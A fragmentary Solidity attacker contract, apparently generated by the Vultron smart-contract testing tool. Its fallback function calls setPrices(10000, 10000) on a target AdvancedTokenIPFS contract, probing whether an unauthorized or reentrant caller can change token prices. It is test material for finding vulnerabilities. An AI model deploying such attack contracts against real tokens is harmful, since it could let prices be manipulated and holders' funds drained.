...
import "/home/osboxes/Develop/vultron/contracts/AdvancedTokenIPFS.sol";

contract Attack_AdvancedTokenIPFS5 {

  AdvancedTokenIPFS public target_contract;

  function Attack_AdvancedTokenIPFS5(address _targetContract) public payable {
      target_contract = AdvancedTokenIPFS(_targetContract);
  } 
  ...
  function() public payable {
    target_contract.setPrices(10000,  10000);
  }
} 
